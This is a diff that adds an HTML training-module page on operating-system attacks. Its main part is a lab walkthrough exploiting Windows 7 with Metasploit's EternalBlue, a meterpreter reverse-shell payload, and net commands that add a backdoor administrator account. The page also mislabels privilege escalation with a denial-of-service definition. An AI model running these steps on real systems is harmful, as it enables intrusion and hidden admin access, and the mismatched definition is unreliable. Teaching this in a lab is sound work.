@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<link rel="shortcut icon" type="png" href="images/icon/favicon.png">
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Comaptible" content="IE=edge">
+	<title>CS Lab Module</title>
+	<meta name="desciption" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<script type="text/javascript" src="script.js"></script>
+	<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
+    <link rel="stylesheet" href="enlighterjs.min.css">
+    <link rel="stylesheet" type="text/css" href="networkattack.css">
+    <script src="enlighterjs.min.js"></script>
+	<!-- BS JavaScript -->
+	<script type="text/javascript" src="bootstrap-4.3.1-dist/js/bootstrap.js"></script>
+	<script>
+		$(window).on('scroll', function(){
+  			if($(window).scrollTop()){
+  			  $('nav').addClass('black');
+ 			 }else {
+ 		   $('nav').removeClass('black');
+ 		 }
+		})
+	</script>
+</head>
+<body>
+
+<!-- Navigation Bar -->
+<header id="header">
+    <nav>
+        <ul>
+            <li><a class="active" href="index.html">Home</a></li>
+            <li><a href="index.html">Training Modules</a></li>
+            <li><a href="#services_section">Assessments</a></li>
+            <li><a href="#contactus_section">Feedback</a></li>
+            <li><a class="get-started" href="login.html">Get Started</a></li>
+        </ul>
+        
+    </nav>
+    
+    <div class="head-container">
+        <div class="quote">
+            <p style="padding-left: 45px; text-align: center;">Operating System Attack</p>
+        </div>
+        <div class="svg-image">
+            <img src="images/extra/os.gif" alt="svg">
+        </div>
+    </div>
+</header>
+
+<!-- Some Popular Subjects -->
+<div class="title" id="course_section">
+    <span>What is OS Attack?</span>
+</div>
+<br>
+<p style="padding: 60px;font-size: 18px; text-align: center; background-color: rgb(186, 192, 212); margin: 15px;border-color: #0b1b5b; border-radius: 15px;"> 
+    An operating system (OS) attack refers to a malicious attempt to exploit vulnerabilities or weaknesses in an 
+    operating system's software or configuration. Operating systems are fundamental software that manage computer 
+    hardware, provide an interface for user applications, and control system resources. Attackers may target operating 
+    systems to gain unauthorized access, disrupt services, steal information, or otherwise compromise the security and 
+    integrity of a computer or network.
+</p><br>
+
+<div class="title" id="course_section">
+    <span>Types of OS based attack</span>
+</div>
+<br>
+<div class="course" >
+    <center><div class="cbox1">
+    <div class="det1"><a href="#content1"><img src="">Privilege Escalation</a></div>
+    <div class="det1"><a href="#content2"><img src="">Buffer Overflow</a></div>
+    <div class="det1"><a href="#content3"><img src="">Remote Code Excecution</a></div>
+    </div></center>
+</div>
+
+<!--Privilege Escalation-->
+<section class="post_content">
+    <div class="container" style="margin: 15px; width: fit-content;" id="content1">
+        <h2 id="before">Privilege Escalation</h2>
+        <br>
+        <p>
+            <strong>Privilege Escalation</strong> attack is a type of cyber attack that aims to disrupt the 
+            availability of a computer system, network, or service by overwhelming it with a high volume of traffic. 
+            The goal of a DoS attack is to make the targeted system or service unavailable to legitimate users, 
+            essentially denying them a`ccess. DoS attacks can last from a few hours to many months, costing companies and consumers time 
+            and money while their resources and services are unavailable.
+            <br><br>
+        </p>
+        <p>
+            <h2 id="before">To Ping windows 7 with Kali linux</h2>
+            <br>
+            <p>
+            <strong>Step 1:</strong> Download windows 7 from this link in your PC (https://archive.org/details/Windows7Professional64Bit)
+            <br><br>
+            <strong>Step 2:</strong> Create a new VM machine in the VM ware.
+        </p>
+            <img src="images/extra/win7attack1.png" style="padding-left:25px; padding-top: 25px;">
+            <br>
+        <p>
+            <br>
+            <strong>Step 3:</strong> Open the windows 7 in VM and TURN OFF firewall settings. In CMD type <strong>ipconfig</strong> to get the IP address of windows7.
+            <br><br>
+        </p>
+            <img src="images/extra/win7attack2.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br>
+        <p>
+            <strong>Step 4:</strong> Now go to kali Linux and type <strong>ifconfig</strong> to get the IP of Kali linux.
+        </p>
+            <img src="images/extra/win7attack3.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br>
+        <p>
+            <strong>Step 5:</strong> Now use the command line interface for the Metasploit Framework <strong>msfconsole</strong> which is a powerful open-source penetration testing and exploitation framework.
+        </p>
+            <img src="images/extra/win7attack4.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br>   
+        <p>
+            <strong>Step 5:</strong> Exploits are used to gain unauthorized access, control, or privileges on a target system or to perform malicious actions. Use <strong>eternalblue</strong> exploit.
+        </p>
+            <img src="images/extra/win7attack5.png" style="padding-left:25px; padding-top: 25px; width: 1200px;">
+            <br><br>  
+        <p>
+            <strong>Step 6:</strong> Then use that exploit named eternalblue. SMB is the vulnerability found here.
+            <div>
+                <p style="padding: 30px;font-size: 18px; width:fit-content; text-align: left; background-color: rgb(232, 232, 236); margin: 25px; border-color: #0b1b5b; border-radius: 5px;">
+                    use exploit /windows/smb/ms17_010_eternalblue
+                </p>
+            </div>
+        </p>
+            <img src="images/extra/win7attack6.png" style="padding-left:25px; padding-top: 25px; width: 1200px;">
+            <br><br>  
+        <p>
+            <strong>Step 7:</strong> set rhosts 192.168.208.129
+        </p>
+            <img src="images/extra/win7attack7.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>
+            <strong>Step 8:</strong> set payload windows/x64/meterpreter/reverse_tcp
+        </p>
+            <img src="images/extra/win7attack8.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 9:</strong> set lhost 192.168.208.128
+        </p>
+            <img src="images/extra/win7attack9.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>
+            <strong>Step 10:</strong> set lport 4321
+        </p>
+            <img src="images/extra/win7attack10.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 11:</strong> exploit
+        </p>
+            <img src="images/extra/win7attack11.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>
+            <strong>Step 12:</strong> After exploit we can access windows 7 from kali linux directly. Will try to create a user in windows from kali. Then type <strong>sysinfo</strong>   
+        </p>
+            <img src="images/extra/win7attack12.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 13:</strong> Type <strong>shell</strong> To take access of windows 7 cmd from kali
+        </p>
+            <img src="images/extra/win7attack13.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 14:</strong> Type <strong>systeminfo</strong> (To check the details from windows cmd)
+        </p>
+            <img src="images/extra/win7attack14.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 15:</strong> Type <strong>tasklist</strong> (To check the taskloist from windows cmd)
+        </p>
+            <img src="images/extra/win7attack15.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 16:</strong> To create a new user in windows system from kali type <strong>net user rocky pas123 /add</strong>. Then to list all the users in windows type <strong>net users</strong>
+        </p>
+            <img src="images/extra/win7attack16.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 17:</strong> To add hacker user to admin group and provide previleges<strong> net localgroup administrators hacker /add </strong>.
+        </p>
+            <img src="images/extra/win7attack17.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>    
+            <strong>Step 18:</strong> To check whether the user has created in the windows7 log off and try to login again. The user is created succesfully from Kali Linux to the windows 7.
+        </p>
+            <img src="images/extra/win7attack18.png" style="padding-left:25px; padding-top: 25px;">
+            <br><br> 
+        <p>
+            Since the windows 7 is having vulnerability called SMB(Server message Block protocol) we bypassed the login in the windows. The exploit we have used here is eternalblue ms17_010_. Using this vulnerability we can try to hack WINDOWS 7 & 2008 R2 Server.
+        <br><br>
+        </p>
+        </p>
+    </div>
+</section>
+<br>
+
+<!--Buffer Overflow-->>
+<section class="post_content">
+    <div class="container" style="margin: 15px; width: fit-content;" id="content2">
+        <h2 id="before">Buffer Overflow</h2>
+        <br>
+        <p>
+            Buffer overflows are a type of software vulnerability and are often exploited by attackers to execute malicious code or gain unauthorized access to a system.
+            <br><br>
+            A buffer overflow, also known as a buffer overrun, occurs when more data is written into a buffer 
+            (temporary data storage) in a program or memory area than it can hold. This overflow of data can lead 
+            to unintended consequences and potentially compromise the security and stability of a system.
+        </p>
+        <br>
+        <div class="syn_image">
+            <img src="images/extra/bufferoverflow.png">
+        </div>
+        <p>
+            Attackers exploit buffer overflow issues by overwriting the memory of an application. This changes the execution path of the program, triggering a 
+            response that damages files or exposes private information. For example, an attacker may introduce extra code, sending new 
+            instructions to the application to gain access to IT systems.
+        </p>
+        <br><br>
+        <h2 id="before">Types of Buffer Overflow Attacks</h2>
+        <p>
+            <br><br>
+            <strong>Stack-based buffer overflows</strong> In this type of attack, the overflow occurs in a program's stack memory. Attackers exploit vulnerabilities that allow them to overwrite return addresses or function pointers stored on the call stack, redirecting program execution to their malicious code.
+            <br><br>
+            <strong>Heap-based attacks</strong> This attack targets the heap memory, which is used for dynamic memory allocation. Attackers exploit vulnerabilities to overwrite heap metadata or manipulate memory allocation, potentially leading to arbitrary code execution.
+        <br><br>
+        <h2 id="before">How Buffer Overflow Works?</h2>
+        <p>
+            Buffer overflows occur when a program writes more data into a buffer (temporary storage area) than it can hold. This excess data can overflow into adjacent memory areas, potentially causing unintended consequences and security vulnerabilities. 
+            <br><br>
+            <div style="padding-left: 150px;">
+                <img src="images/extra/bufferoverflow1.png">
+            </div>
+            <div class="list">
+            <ul>
+                <li>Programs use buffers to temporarily store data, such as input from a user or data read from a file.</li>
+                <br>
+                <li>Buffers are allocated a fixed amount of memory, which is determined by the size of the buffer.</li>
+                <br>
+                <li>Programs often copy data from one location to a buffer using functions like strcpy, memcpy, or similar.</li>
+                <br>
+                <li>These functions do not always check if the data being copied fits within the allocated buffer size.</li>
+                <br>
+                <li>If the input data provided to the program exceeds the buffer's allocated size, the extra data overflows into adjacent memory locations.</li>
+                <br>
+                <li>The overflowed data can overwrite adjacent memory, including variables, return addresses, function pointers, and control flow data.</li>
+                <br>
+                <li>If an attacker can manipulate the overflowed data, they may overwrite control data, such as function return addresses stored on the call stack.</li>
+            </ul>
+            <br><br>
+            </div>
+        </p>
+</section>
+<br><br>
+
+<!---Remote Code Excecution--->>
+<section class="post_content">
+    <div class="container" style="margin: 15px; width: fit-content;" id="content3">
+        <h2 id="before">Remote Code Excecution</h2>
+        <br>
+        <p>
+            Remote Code Execution (RCE) is a cybersecurity vulnerability that occurs when an attacker is able to execute arbitrary 
+            code on a target system from a remote location, without physical access to the system. This type of vulnerability can 
+            lead to serious security breaches and compromise the integrity, availability, and confidentiality of systems and data.
+        </p>
+        <br>
+        <div class="syn_image" style="padding-left: 50px;">
+            <img src="images/extra/RCE.jpg">
+        </div>
+        <br>
+        <p>
+            RCE vulnerabilities require immediate attention due to their potential to cause significant damage. Organizations should 
+            prioritize proactive security measures to prevent and mitigate the risk of Remote Code Execution attacks.
+        </p>
+        <br><br>
+        <h2 id="before">How Remote Code Excecution works</h2>
+            <br>
+            <p>
+                <strong>Step 1: Vulnerability Exploitation</strong><br><br>
+            </p>
+            <div class="list">
+            <ul>
+                <li>An attacker identifies a vulnerability in a software application or system that allows them to inject and execute their own code.</li><br>
+                <li>Common vulnerabilities that can lead to RCE include buffer overflows, SQL injection, and insecure deserialization.</li><br>
+            </ul>
+            <br>
+            </div>
+
+            <p>
+                <strong>Step 2: Payload Injection</strong><br><br>
+            </p>
+            <div class="list">
+            <ul>
+                <li>Once the vulnerability is identified, the attacker crafts a payload, which is a piece of malicious code, typically in the form of shellcode or scripted commands.</li><br>
+            </ul>
+            <br>
+            </div>
+
+            <div style="padding-left: 150px; width: 10px;">
+                <img src="images/extra/RCE1.gif">
+            </div>
+
+            <p>
+                <strong>Step 3: Payload Delivery</strong><br><br>
+            </p>
+            <div class="list">
+            <ul>
+                <li>The attacker sends the payload to the target system using various methods, such as through network communication, email attachments, or manipulated web requests.</li><br>
+            </ul>
+            <br>
+            </div>
+
+            <p>
+                <strong>Step 4: Code Execution</strong><br><br>
+            </p>
+            <div class="list">
+            <ul>
+                <li>The vulnerable software processes the payload as if it were legitimate code, executing the attacker's instructions.</li><br>
+            </ul>
+            <br>
+            </div>
+
+            <p>
+                <strong>Step 5: Impact and Consequences</strong><br><br>
+            </p>
+            <div class="list">
+            <ul>
+                <li>Depending on the level of access gained through the RCE, an attacker can take control of the compromised system, escalate privileges, steal sensitive data, install backdoors, or perform other malicious actions.</li><br>
+            </ul>
+            <br>
+            </div>
+
+            <p>
+                RCE vulnerabilities are particularly dangerous because they provide attackers with the ability 
+                to remotely control a system as if they were physically present, essentially giving them full 
+                access to the compromised machine. The impact can be severe, especially if the compromised system 
+                is part of a larger network or critical infrastructure
+            </p><br><br>
+        </p>
+</section>
+
+
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-container">
+        <div class="left-col">
+            </br></br>
+            <div class="quote">
+                <p style="color: #fff">Cyber Security Self Study Platform</p>
+            </div>
+            <div class="logo"></div>
+            <p class="rights-text">Copyright © 2021</p>
+            <br><p><img src="images/icon/location.png">&nbsp;ITS, INS Valsura, Jamnagar, Gujarat-360115</p>
+        </div>
+        <div class="right-col">
+            <div class="logo">
+                <img src="images/extra/valsura.png">
+                
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
